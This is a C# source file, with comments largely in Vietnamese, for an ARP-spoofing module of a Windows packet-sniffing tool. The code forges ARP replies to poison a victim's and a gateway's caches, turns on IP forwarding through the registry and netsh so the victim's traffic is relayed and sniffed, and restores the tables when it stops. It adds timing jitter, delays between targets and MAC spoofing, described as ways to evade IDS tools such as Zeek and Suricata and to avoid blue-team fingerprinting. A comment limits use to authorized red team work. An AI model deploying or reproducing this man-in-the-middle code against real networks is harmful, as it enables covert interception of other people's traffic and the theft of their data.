using System.Net;
using System.Net.NetworkInformation;
using RedPacketSniffer.Core.Capture;
using RedPacketSniffer.Core.NdisApi;

namespace RedPacketSniffer.Core.Analysis;

/// <summary>
/// ARP Spoofing module cho MITM attack trên LAN.
///
/// Cách hoạt động:
/// 1. Auto-enable Windows IP Forwarding (nếu chưa bật)
/// 2. Gửi ARP Reply giả tới target (nạn nhân) — claim "gateway IP is at attacker MAC"
/// 3. Gửi ARP Reply giả tới gateway — claim "target IP is at attacker MAC"
/// 4. Traffic giữa target ↔ gateway đi qua attacker → Windows IP routing forward → sniff được
/// 5. Khi dừng: restore ARP table + restore IP Forwarding về trạng thái ban đầu
///
/// IP Forwarding là bắt buộc — nếu không bật, Windows drop packet của nạn nhân → mất kết nối.
///
/// Lưu ý: Tool này chỉ dùng cho authorized red team engagement.
/// </summary>
public sealed class ArpSpoofer : IDisposable
{
    private readonly PacketCaptureEngine _engine;
    private CancellationTokenSource? _spoofCts;
    private Task? _spoofTask;
    private readonly List<ArpSpoofTarget> _targets = new();
    private readonly object _lock = new();

    // Config
    private int _intervalMs = 2000; // Gửi ARP reply mỗi 2 giây
    private byte[] _attackerMac = Array.Empty<byte>();
    private byte[] _gatewayMac = Array.Empty<byte>();
    private uint _gatewayIp;

    // Anti-detection: timing jitter + MAC spoofing + inter-target delay
    private double _jitterPercent = 0.30;     // ±30% randomization on interval
    private readonly Random _rng = new();
    private byte[]? _spoofedMac;              // Custom source MAC (null = real adapter MAC)
    private int _interTargetDelayBaseMs = 150; // Base delay between poisoning each target (ms)

    /// <summary>
    /// Effective source MAC — spoofed if set, otherwise real adapter MAC.
    /// All outbound ARP frames use this MAC as sender to avoid fingerprinting
    /// the attacker's real NIC.
    /// </summary>
    private byte[] EffectiveMac => _spoofedMac ?? _attackerMac;

    // IP Forwarding state
    private bool _ipForwardingWasEnabled = false;
    private bool _ipForwardingChanged = false;

    public event Action<string>? OnLog;
    public event Action<ArpSpoofStatus>? OnStatusChanged;

    public ArpSpoofState State { get; private set; } = ArpSpoofState.Idle;
    public int TargetCount => _targets.Count;
    public int PacketsSent { get; private set; }

    public ArpSpoofer(PacketCaptureEngine engine)
    {
        _engine = engine;
    }

    /// <summary>
    /// Cấu hình ARP spoof: gateway IP + MAC, interval
    /// Gateway MAC có thể lấy từ ARP cache hoặc tự resolve bằng ARP request
    /// </summary>
    public void Configure(string gatewayIp, string gatewayMac, int intervalMs = 2000)
    {
        _gatewayIp = IpToUint(gatewayIp);
        _gatewayMac = ParseMac(gatewayMac);
        if (_gatewayMac.Length != 6 || _gatewayMac.All(b => b == 0))
            throw new ArgumentException($"Invalid gateway MAC: '{gatewayMac}'. Ping the gateway first so its MAC enters the ARP cache, then use arp -a to get it.");
        _intervalMs = Math.Max(500, intervalMs);
        _attackerMac = _engine.GetSelectedAdapterMac();
        Log($"Configured: Gateway {gatewayIp} ({gatewayMac}), Interval {_intervalMs}ms ±{_jitterPercent * 100:F0}%");
        if (_spoofedMac != null)
            Log($"  Using spoofed MAC: {FormatMac(_spoofedMac)}");
    }

    /// <summary>
    /// Set a spoofed source MAC address to use in ARP frames instead of
    /// the real adapter MAC. Prevents IDS/blue team from fingerprinting
    /// the attacker NIC via OUI lookup.
    /// Pass null or empty to revert to the real adapter MAC.
    /// </summary>
    public void SetSpoofedMac(string? mac)
    {
        if (string.IsNullOrWhiteSpace(mac))
        {
            _spoofedMac = null;
            Log("Spoofed MAC cleared — using real adapter MAC");
            return;
        }

        var parsed = ParseMac(mac);
        if (parsed.All(b => b == 0))
            throw new ArgumentException("Invalid MAC address format. Use AA:BB:CC:DD:EE:FF or AA-BB-CC-DD-EE-FF.");

        _spoofedMac = parsed;
        Log($"Spoofed MAC set: {FormatMac(_spoofedMac)}");
    }

    /// <summary>
    /// Set timing jitter percentage for ARP replay interval randomization.
    /// Range: 0.0 (no jitter) to 0.50 (±50%). Default: 0.30 (±30%).
    ///
    /// Why: fixed-interval ARP replies create a detectable periodic pattern
    /// in IDS/NTA tools (e.g. Zeek, Suricata). Jitter breaks the pattern.
    /// </summary>
    public void SetJitter(double percent)
    {
        _jitterPercent = Math.Clamp(percent, 0.0, 0.50);
        Log($"Jitter set to ±{_jitterPercent * 100:F0}%");
    }

    /// <summary>
    /// Set base inter-target delay (ms) — random delay added between poisoning
    /// each target to avoid burst pattern. Range: 0-1000ms. Default: 150ms.
    ///
    /// Actual delay per target = baseMs ± jitter%.
    /// Set 0 to disable inter-target delay (not recommended for >3 targets).
    /// </summary>
    public void SetInterTargetDelay(int baseMs)
    {
        _interTargetDelayBaseMs = Math.Clamp(baseMs, 0, 1000);
        Log($"Inter-target delay set to {_interTargetDelayBaseMs}ms base (±jitter)");
    }

    /// <summary>
    /// Generate a random locally-administered unicast MAC address.
    /// Bit 0 of first octet = 0 (unicast), bit 1 = 1 (locally administered).
    /// Useful when caller doesn't have a specific MAC to spoof.
    /// </summary>
    public static byte[] GenerateRandomMac()
    {
        var mac = new byte[6];
        Random.Shared.NextBytes(mac);
        mac[0] = (byte)((mac[0] & 0xFC) | 0x02); // Locally administered, unicast
        return mac;
    }

    /// <summary>
    /// Compute a jittered delay from a base value.
    /// Returns baseMs ± (baseMs * jitterPercent), uniformly distributed.
    /// </summary>
    private int GetJitteredDelay(int baseMs)
    {
        if (_jitterPercent <= 0.0 || baseMs <= 0) return baseMs;
        double range = baseMs * _jitterPercent;
        double offset = (_rng.NextDouble() * 2.0 - 1.0) * range; // [-range, +range]
        return Math.Max(50, (int)(baseMs + offset)); // Floor at 50ms to avoid spin
    }

    /// <summary>
    /// Auto-detect gateway IP từ routing table, resolve MAC qua ARP cache
    /// </summary>
    public (string ip, string mac)? AutoDetectGateway()
    {
        try
        {
            // Lấy default gateway từ routing table
            var gw = NetworkInterface.GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up
                    && n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties().GatewayAddresses)
                .FirstOrDefault(g => g.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

            if (gw == null) return null;

            string gwIp = gw.Address.ToString();

            // Lấy MAC từ ARP cache (nếu đã resolve)
            string? gwMac = GetMacFromArpCache(gwIp);
            if (gwMac == null)
            {
                Log($"Gateway {gwIp} found but MAC not in ARP cache. Send a ping first.");
                return (gwIp, "");
            }

            return (gwIp, gwMac);
        }
        catch (Exception ex)
        {
            Log($"Auto-detect failed: {ex.Message}");
            return null;
        }
    }

    /// <summary>
    /// Thêm target IP để spoof (nạn nhân)
    /// </summary>
    public void AddTarget(string targetIp, string targetMac)
    {
        var mac = ParseMac(targetMac);
        if (mac.Length != 6 || mac.All(b => b == 0))
            throw new ArgumentException($"Invalid target MAC: '{targetMac}'. Ping the target first so its MAC enters the ARP cache.");
        lock (_lock)
        {
            if (_targets.Any(t => t.Ip == targetIp))
            {
                Log($"Target {targetIp} already added");
                return;
            }
            _targets.Add(new ArpSpoofTarget
            {
                Ip = targetIp,
                IpUint = IpToUint(targetIp),
                Mac = mac
            });
            Log($"Target added: {targetIp} ({targetMac})");
        }
    }

    /// <summary>
    /// Xóa target
    /// </summary>
    public void RemoveTarget(string targetIp)
    {
        lock (_lock)
        {
            _targets.RemoveAll(t => t.Ip == targetIp);
            Log($"Target removed: {targetIp}");
        }
    }

    /// <summary>
    /// Bắt đầu ARP spoofing.
    /// Tự động bật Windows IP Forwarding để packet của nạn nhân được forward
    /// qua máy attacker thay vì bị drop (gây mất kết nối).
    /// </summary>
    public void Start()
    {
        if (State == ArpSpoofState.Running)
            throw new InvalidOperationException("ARP spoofing is already running.");
        if (_gatewayIp == 0 || _gatewayMac.Length != 6 || _gatewayMac.All(b => b == 0))
            throw new InvalidOperationException("Gateway not configured. Call Configure() first.");
        if (_targets.Count == 0)
            throw new InvalidOperationException("No targets added. Call AddTarget() first.");

        // Spoofed MAC + Windows IP Forwarding = guaranteed outage.
        // The NIC hardware filter drops frames sent to an unknown MAC, so the Windows
        // stack never receives the packets to forward them.
        if (_spoofedMac != null)
            throw new InvalidOperationException(
                $"Using spoofed MAC {FormatMac(_spoofedMac)} — Windows IP Forwarding CANNOT forward packets sent to an unknown MAC, so the victim will lose connectivity. " +
                "Call SetSpoofedMac(null) to use the adapter's real MAC, then Start again. " +
                "Use a spoofed MAC only with a dedicated userspace relay (not currently supported).");

        // Bật IP Forwarding trước khi spoof — hàm này tự verify per-interface,
        // nếu không bật được thì throw để ABORT (không poison khi không forward được,
        // vì poison mà không forward → nạn nhân mất kết nối).
        EnableIpForwarding();

        _attackerMac = _engine.GetSelectedAdapterMac();
        PacketsSent = 0;
        _spoofCts = new CancellationTokenSource();
        _spoofTask = Task.Run(() => SpoofLoop(_spoofCts.Token));
        State = ArpSpoofState.Running;
        OnStatusChanged?.Invoke(GetStatus());
        Log($"ARP spoofing started (src MAC: {FormatMac(EffectiveMac)}, jitter: ±{_jitterPercent * 100:F0}%, inter-target: {_interTargetDelayBaseMs}ms)");
    }

    /// <summary>
    /// Dừng ARP spoofing và restore ARP table cho tất cả target
    /// </summary>
    public async Task StopAsync()
    {
        if (State != ArpSpoofState.Running) return;

        _spoofCts?.Cancel();
        if (_spoofTask != null)
        {
            try { await _spoofTask; }
            catch (OperationCanceledException) { }
        }

        // Restore ARP tables — gửi ARP reply đúng MAC cho cả target và gateway
        Log("Restoring ARP tables...");
        State = ArpSpoofState.Restoring;
        OnStatusChanged?.Invoke(GetStatus());

        for (int i = 0; i < 5; i++) // Gửi 5 lần để chắc chắn
        {
            RestoreArpTables();
            await Task.Delay(500);
        }

        // Restore IP Forwarding về trạng thái ban đầu
        RestoreIpForwarding();

        _spoofCts?.Dispose();
        _spoofCts = null;
        _spoofTask = null;
        State = ArpSpoofState.Idle;
        OnStatusChanged?.Invoke(GetStatus());
        Log("ARP spoofing stopped, ARP tables restored");
    }

    /// <summary>
    /// Lấy trạng thái hiện tại
    /// </summary>
    public ArpSpoofStatus GetStatus()
    {
        lock (_lock)
        {
            return new ArpSpoofStatus
            {
                State = State.ToString(),
                GatewayIp = UintToIp(_gatewayIp),
                GatewayMac = FormatMac(_gatewayMac),
                AttackerMac = FormatMac(_attackerMac),
                EffectiveMac = FormatMac(EffectiveMac),
                UsingSpoofedMac = _spoofedMac != null,
                IntervalMs = _intervalMs,
                JitterPercent = _jitterPercent,
                InterTargetDelayMs = _interTargetDelayBaseMs,
                PacketsSent = PacketsSent,
                Targets = _targets.Select(t => new ArpSpoofTargetInfo
                {
                    Ip = t.Ip,
                    Mac = FormatMac(t.Mac),
                    LastPoisoned = t.LastPoisoned
                }).ToList()
            };
        }
    }

    public List<ArpSpoofTargetInfo> GetTargets()
    {
        lock (_lock)
        {
            return _targets.Select(t => new ArpSpoofTargetInfo
            {
                Ip = t.Ip,
                Mac = FormatMac(t.Mac),
                LastPoisoned = t.LastPoisoned
            }).ToList();
        }
    }

    // ============================================================
    // Spoof loop
    // ============================================================

    private void SpoofLoop(CancellationToken ct)
    {
        byte[] srcMac = EffectiveMac;

        while (!ct.IsCancellationRequested)
        {
            List<ArpSpoofTarget> targets;
            lock (_lock)
            {
                targets = new List<ArpSpoofTarget>(_targets);
            }

            for (int i = 0; i < targets.Count; i++)
            {
                if (ct.IsCancellationRequested) break;
                var target = targets[i];

                try
                {
                    // 1. Poison target: "gateway IP is at attacker MAC"
                    byte[] poisonTarget = BuildArpReply(
                        senderMac: srcMac,
                        senderIp: _gatewayIp,
                        targetMac: target.Mac,
                        targetIp: target.IpUint
                    );
                    _engine.SendRawPacket(poisonTarget);

                    // 2. Poison gateway: "target IP is at attacker MAC"
                    byte[] poisonGw = BuildArpReply(
                        senderMac: srcMac,
                        senderIp: target.IpUint,
                        targetMac: _gatewayMac,
                        targetIp: _gatewayIp
                    );
                    _engine.SendRawPacket(poisonGw);

                    PacketsSent += 2;
                    target.LastPoisoned = DateTime.UtcNow;
                }
                catch (Exception ex)
                {
                    Log($"Spoof error for {target.Ip}: {ex.Message}");
                }

                // Inter-target delay: randomized pause between poisoning each target
                // to avoid burst pattern (all targets poisoned in <1ms window)
                if (_interTargetDelayBaseMs > 0 && i < targets.Count - 1)
                {
                    int delay = GetJitteredDelay(_interTargetDelayBaseMs);
                    try { Task.Delay(delay, ct).Wait(ct); }
                    catch (OperationCanceledException) { break; }
                }
            }

            // Main interval with jitter — breaks periodic detection pattern
            int jitteredInterval = GetJitteredDelay(_intervalMs);
            try { Task.Delay(jitteredInterval, ct).Wait(ct); }
            catch (OperationCanceledException) { break; }
        }
    }

    private void RestoreArpTables()
    {
        List<ArpSpoofTarget> targets;
        lock (_lock)
        {
            targets = new List<ArpSpoofTarget>(_targets);
        }

        foreach (var target in targets)
        {
            try
            {
                // Restore target: "gateway IP is at REAL gateway MAC"
                byte[] restoreTarget = BuildArpReply(
                    senderMac: _gatewayMac,
                    senderIp: _gatewayIp,
                    targetMac: target.Mac,
                    targetIp: target.IpUint
                );
                _engine.SendRawPacket(restoreTarget);

                // Restore gateway: "target IP is at REAL target MAC"
                byte[] restoreGw = BuildArpReply(
                    senderMac: target.Mac,
                    senderIp: target.IpUint,
                    targetMac: _gatewayMac,
                    targetIp: _gatewayIp
                );
                _engine.SendRawPacket(restoreGw);
            }
            catch { /* Best effort */ }
        }
    }

    // ============================================================
    // ARP frame builder
    // ============================================================

    /// <summary>
    /// Build complete Ethernet frame chứa ARP Reply
    /// </summary>
    private static byte[] BuildArpReply(byte[] senderMac, uint senderIp, byte[] targetMac, uint targetIp)
    {
        // Ethernet frame: 14 (header) + 28 (ARP) = 42 bytes, pad to 60 minimum
        var frame = new byte[60];

        // Ethernet header
        Array.Copy(targetMac, 0, frame, 0, 6);  // Dst MAC
        Array.Copy(senderMac, 0, frame, 6, 6);  // Src MAC
        frame[12] = 0x08; frame[13] = 0x06;     // EtherType = ARP (0x0806)

        // ARP header
        frame[14] = 0x00; frame[15] = 0x01;     // Hardware type = Ethernet
        frame[16] = 0x08; frame[17] = 0x00;     // Protocol type = IPv4
        frame[18] = 0x06;                        // Hardware size = 6 (MAC)
        frame[19] = 0x04;                        // Protocol size = 4 (IPv4)
        frame[20] = 0x00; frame[21] = 0x02;     // Opcode = ARP Reply

        // Sender MAC + IP
        Array.Copy(senderMac, 0, frame, 22, 6);
        frame[28] = (byte)(senderIp & 0xFF);
        frame[29] = (byte)((senderIp >> 8) & 0xFF);
        frame[30] = (byte)((senderIp >> 16) & 0xFF);
        frame[31] = (byte)((senderIp >> 24) & 0xFF);

        // Target MAC + IP
        Array.Copy(targetMac, 0, frame, 32, 6);
        frame[38] = (byte)(targetIp & 0xFF);
        frame[39] = (byte)((targetIp >> 8) & 0xFF);
        frame[40] = (byte)((targetIp >> 16) & 0xFF);
        frame[41] = (byte)((targetIp >> 24) & 0xFF);

        return frame;
    }

    // ============================================================
    // IP Forwarding — bật/tắt Windows IP routing
    // ============================================================

    private const string IP_FORWARD_REG_PATH = @"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters";
    private const string IP_FORWARD_REG_KEY = "IPEnableRouter";

    // Trạng thái forwarding per-interface trước khi spoof (để restore chính xác).
    // true = đã enabled, false = đã disabled, null = không đọc được.
    private readonly Dictionary<string, bool?> _ifForwardingBefore = new();

    /// <summary>
    /// Bật Windows IP Forwarding qua registry + netsh per-interface.
    /// Lưu lại trạng thái cũ để restore khi dừng spoof.
    ///
    /// Tại sao cần: sau ARP poison, traffic nạn nhân đến NIC attacker.
    /// Nếu IP forwarding tắt → Windows drop packet → nạn nhân mất mạng.
    /// Bật forwarding → Windows route packet đến đúng gateway → nạn nhân vẫn dùng mạng bình thường,
    /// attacker sniff được traffic đi qua.
    ///
    /// LƯU Ý: `netsh interface ipv4 show global` KHÔNG có dòng Forwarding
    /// trên nhiều bản Windows — trạng thái thật nằm ở per-interface
    /// (`netsh interface ipv4 show interface "Tên-Card-Mạng"` → dòng `Forwarding : enabled`).
    /// </summary>
    private void EnableIpForwarding()
    {
        try
        {
            _ifForwardingBefore.Clear();

            // Đọc trạng thái persistent từ registry
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IP_FORWARD_REG_PATH, writable: false);
            var value = key?.GetValue(IP_FORWARD_REG_KEY);
            _ipForwardingWasEnabled = value is int v && v == 1;

            // Ghi registry IPEnableRouter=1 để persistent sau reboot (cần Admin).
            // Runtime vẫn cần netsh per-interface bên dưới.
            try
            {
                using var wkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IP_FORWARD_REG_PATH, writable: true);
                wkey?.SetValue(IP_FORWARD_REG_KEY, 1, Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch { /* best effort — netsh mới quyết định */ }

            // 1. Thử bật global forwarding (best-effort: tham số này không tồn tại
            // trên một số bản Windows — per-interface bên dưới mới là phần bắt buộc).
            var (exitGlobal, _, errGlobal) = RunNetsh("interface ipv4 set global forwarding=enabled");
            if (exitGlobal != 0)
                Log($"NOTE: global forwarding set skipped ({errGlobal.Trim()}), continuing with per-interface.");

            // 2. Bật per-interface forwarding cho mọi NIC đang Up.
            // Đây là bước bắt buộc — thiếu nó Windows vẫn drop → nạn nhân mất mạng.
            // Xác định interface đang sniff (khớp MAC với adapter đã chọn) để verify
            // đúng card — các card ảo (VPN/VMware/VirtualBox) đang Up nhưng không liên
            // quan không được làm fail cả quá trình.
            string? targetIf = FindSniffingInterfaceName();
            if (targetIf != null)
                Log($"Sniffing interface: '{targetIf}' (MAC matched to selected adapter)");
            else
                Log("NOTE: could not identify the sniffing interface by MAC — using relaxed verification.");

            bool anySetOk = false;
            bool? targetSetOk = null;
            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus != OperationalStatus.Up) continue;
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

                // Ghi nhận trạng thái trước khi đổi để restore chính xác
                _ifForwardingBefore[nic.Name] = GetInterfaceForwarding(nic.Name);

                // Dùng tên interface trong ngoặc kép vì có thể chứa khoảng trắng
                var (exitIf, _, errIf) = RunNetsh($"interface ipv4 set interface \"{nic.Name}\" forwarding=enabled");
                bool ok = exitIf == 0;
                if (nic.Name == targetIf) targetSetOk = ok;
                if (ok)
                {
                    anySetOk = true;
                    Log($"IP forwarding enabled on interface '{nic.Name}' (was: {FormatTriState(_ifForwardingBefore[nic.Name])})");
                }
                else
                {
                    Log($"WARNING: cannot enable forwarding on '{nic.Name}': {errIf.Trim()}");
                }
            }

            if (targetIf != null && targetSetOk == false)
                throw new InvalidOperationException(
                    $"Could not enable forwarding on the sniffing interface '{targetIf}' (other virtual adapters don't matter). " +
                    "Run the tool as Administrator. " +
                    $"Try manually: netsh interface ipv4 set interface \"{targetIf}\" forwarding=enabled");

            if (!anySetOk)
                throw new InvalidOperationException(
                    "Could not enable forwarding on any interface (all netsh calls failed). " +
                    "Run the tool as Administrator. " +
                    "Try manually: netsh interface ipv4 set interface \"Wi-Fi\" forwarding=enabled");

            // 3. Verify runtime state per-interface (only the sniffing NIC is mandatory)
            var verify = VerifyInterfacesForwarding(targetIf);
            if (verify == false)
                throw new InvalidOperationException(
                    targetIf != null
                        ? $"Sniffing interface '{targetIf}' still reports forwarding disabled (it may be reverted by GPO immediately). " +
                          $"Check manually: netsh interface ipv4 show interface \"{targetIf}\" — the Forwarding line must be enabled."
                        : "No interface has forwarding enabled (all still disabled). " +
                          "Check manually: netsh interface ipv4 show interface \"Wi-Fi\" — the Forwarding line must be enabled.");
            if (verify == null)
                Log("WARNING: could not read back the forwarding state for verification (netsh show output not parseable) — " +
                    "netsh set reported success so continuing. If the victim loses connectivity, stop spoofing immediately.");

            _ipForwardingChanged = true;
            Log(_ipForwardingWasEnabled
                ? "IP Forwarding verified (per-interface enabled)"
                : "IP Forwarding ENABLED (per-interface, will restore on stop)");
        }
        catch (InvalidOperationException)
        {
            _ipForwardingChanged = false;
            throw; // để Start() abort, không poison khi không forward được
        }
        catch (Exception ex)
        {
            _ipForwardingChanged = false;
            throw new InvalidOperationException(
                $"Could not enable IP Forwarding: {ex.Message}. " +
                "The victim will lose connectivity if spoofing continues — aborted. " +
                "Try manually (Admin): netsh interface ipv4 set interface \"Wi-Fi\" forwarding=enabled", ex);
        }
    }

    /// <summary>
    /// Đọc trạng thái forwarding runtime của 1 interface qua
    /// `netsh interface ipv4 show interface "Name"` (dòng `Forwarding : enabled|disabled`).
    /// Trả về null nếu không đọc/parse được.
    /// </summary>
    private static bool? GetInterfaceForwarding(string ifName)
    {
        try
        {
            var (exit, stdout, _) = RunNetsh($"interface ipv4 show interface \"{ifName}\"");
            if (exit != 0) return null;
            foreach (var line in stdout.Split('\n'))
            {
                var t = line.Trim();
                int colon = t.IndexOf(':');
                if (colon < 0) continue;
                var k = t[..colon].Trim();
                var val = t[(colon + 1)..].Trim();
                if (k.Equals("Forwarding", StringComparison.OrdinalIgnoreCase))
                {
                    if (val.Equals("enabled", StringComparison.OrdinalIgnoreCase)) return true;
                    if (val.Equals("disabled", StringComparison.OrdinalIgnoreCase)) return false;
                    return null;
                }
            }
            return null;
        }
        catch { return null; }
    }

    /// <summary>
    /// Tìm tên Windows interface đang sniff bằng cách khớp MAC với adapter đã chọn
    /// trong capture engine. Trả về null nếu chưa chọn adapter hoặc không khớp.
    /// </summary>
    private string? FindSniffingInterfaceName()
    {
        try
        {
            byte[] selMac = _engine.GetSelectedAdapterMac();
            if (selMac.Length != 6) return null;
            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus != OperationalStatus.Up) continue;
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
                try
                {
                    byte[] mac = nic.GetPhysicalAddress().GetAddressBytes();
                    if (mac.Length == 6 && mac.SequenceEqual(selMac))
                        return nic.Name;
                }
                catch { /* bỏ qua NIC lỗi đọc MAC */ }
            }
        }
        catch { /* chưa chọn adapter — fallback verify nới lỏng */ }
        return null;
    }

    /// <summary>
    /// Verify tất cả NIC đang Up. Nếu biết card đang sniff (targetIf) thì chỉ check
    /// đúng card đó. Ngược lại: true = có ít nhất 1 interface enabled;
    /// false = tất cả đều disabled; null = không đọc được.
    /// </summary>
    private bool? VerifyInterfacesForwarding(string? targetIf)
    {
        var states = new List<(string name, bool? st)>();

        foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.OperationalStatus != OperationalStatus.Up) continue;
            if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

            var st = GetInterfaceForwarding(nic.Name);
            states.Add((nic.Name, st));
            Log($"  verify '{nic.Name}': forwarding={FormatTriState(st)}");
        }

        // Biết card đang sniff → chỉ check card đó, card ảo khác kệ
        if (targetIf != null)
        {
            foreach (var s in states)
                if (s.name == targetIf) return s.st;
        }

        bool anyEnabled = states.Any(s => s.st == true);
        bool anyDisabled = states.Any(s => s.st == false);
        if (anyEnabled)
        {
            if (anyDisabled)
                Log("NOTE: a few other interfaces still report disabled, but they are not the sniffing NIC — ignoring.");
            return true;
        }
        if (anyDisabled) return false;
        return null; // không đọc được / không có NIC nào để check
    }

    private static string FormatTriState(bool? v) => v == true ? "enabled" : v == false ? "disabled" : "unknown";

    private static (int exitCode, string stdout, string stderr) RunNetsh(string args)
    {
        var psi = new System.Diagnostics.ProcessStartInfo("netsh", args)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        using var proc = System.Diagnostics.Process.Start(psi)
            ?? throw new InvalidOperationException("Could not start netsh.");
        string stdout = proc.StandardOutput.ReadToEnd();
        string stderr = proc.StandardError.ReadToEnd();
        proc.WaitForExit(5000);
        return (proc.ExitCode, stdout, stderr);
    }

    /// <summary>
    /// Restore IP Forwarding về trạng thái trước khi spoof.
    /// Chỉ tắt những interface mà trước đó đang tắt — không phá cấu hình routing có sẵn.
    /// </summary>
    private void RestoreIpForwarding()
    {
        if (!_ipForwardingChanged) return; // Không đổi gì thì không cần restore

        try
        {
            // Restore per-interface: chỉ disable những interface mà trước đó là disabled
            foreach (var kv in _ifForwardingBefore)
            {
                if (kv.Value != false) continue; // trước đó đã enabled/unknown → để nguyên
                var (exit, _, _) = RunNetsh($"interface ipv4 set interface \"{kv.Key}\" forwarding=disabled");
                Log(exit == 0
                    ? $"IP Forwarding restored to DISABLED on '{kv.Key}'"
                    : $"WARNING: Failed to restore forwarding on '{kv.Key}'. Run manually: netsh interface ipv4 set interface \"{kv.Key}\" forwarding=disabled");
            }

            // Restore registry nếu ban đầu đang tắt
            if (!_ipForwardingWasEnabled)
            {
                try
                {
                    using var wkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IP_FORWARD_REG_PATH, writable: true);
                    wkey?.SetValue(IP_FORWARD_REG_KEY, 0, Microsoft.Win32.RegistryValueKind.DWord);
                }
                catch { /* best effort */ }
            }

            _ipForwardingChanged = false;
        }
        catch (Exception ex)
        {
            Log($"WARNING: Cannot restore IP Forwarding: {ex.Message}");
        }
    }

    // ============================================================
    // Helpers
    // ============================================================

    private static uint IpToUint(string ip)
    {
        var bytes = IPAddress.Parse(ip).GetAddressBytes();
        // Network byte order (big endian) nhưng struct dùng raw bytes
        return BitConverter.ToUInt32(bytes, 0);
    }

    private static string UintToIp(uint ip)
    {
        if (ip == 0) return "";
        return new IPAddress(ip).ToString();
    }

    private static byte[] ParseMac(string mac)
    {
        if (string.IsNullOrEmpty(mac)) return new byte[6];
        var parts = mac.Split(':', '-');
        if (parts.Length != 6) return new byte[6];
        var bytes = new byte[6];
        for (int i = 0; i < 6; i++)
            bytes[i] = Convert.ToByte(parts[i], 16);
        return bytes;
    }

    private static string FormatMac(byte[] mac)
    {
        if (mac == null || mac.Length < 6) return "";
        return $"{mac[0]:X2}:{mac[1]:X2}:{mac[2]:X2}:{mac[3]:X2}:{mac[4]:X2}:{mac[5]:X2}";
    }

    private static string? GetMacFromArpCache(string ip)
    {
        try
        {
            // Parse ARP cache trên Windows
            var psi = new System.Diagnostics.ProcessStartInfo("arp", $"-a {ip}")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = System.Diagnostics.Process.Start(psi);
            if (proc == null) return null;

            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(3000);

            // Parse output: "  192.168.1.1      aa-bb-cc-dd-ee-ff     dynamic"
            foreach (var line in output.Split('\n'))
            {
                var trimmed = line.Trim();
                if (!trimmed.StartsWith(ip)) continue;
                var parts = trimmed.Split(new[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length >= 2)
                {
                    return parts[1].Replace('-', ':').ToUpperInvariant();
                }
            }
        }
        catch { }
        return null;
    }

    private void Log(string message) => OnLog?.Invoke(message);

    public void Dispose()
    {
        if (State == ArpSpoofState.Running)
        {
            _spoofCts?.Cancel();
            _spoofTask?.Wait(TimeSpan.FromSeconds(3));

            // Best-effort restore khi bị dispose đột ngột
            try { RestoreArpTables(); } catch { }
            RestoreIpForwarding();
        }
        _spoofCts?.Dispose();
    }
}

// ============================================================
// Data models
// ============================================================

public enum ArpSpoofState
{
    Idle,
    Running,
    Restoring
}

public class ArpSpoofTarget
{
    public string Ip { get; init; } = "";
    public uint IpUint { get; init; }
    public byte[] Mac { get; init; } = Array.Empty<byte>();
    public DateTime LastPoisoned { get; set; }
}

public class ArpSpoofStatus
{
    public string State { get; init; } = "";
    public string GatewayIp { get; init; } = "";
    public string GatewayMac { get; init; } = "";
    public string AttackerMac { get; init; } = "";
    public string EffectiveMac { get; init; } = "";   // MAC actually used in frames
    public bool UsingSpoofedMac { get; init; }
    public int IntervalMs { get; init; }
    public double JitterPercent { get; init; }
    public int InterTargetDelayMs { get; init; }
    public int PacketsSent { get; init; }
    public List<ArpSpoofTargetInfo> Targets { get; init; } = new();
}

public class ArpSpoofTargetInfo
{
    public string Ip { get; init; } = "";
    public string Mac { get; init; } = "";
    public DateTime LastPoisoned { get; init; }
}
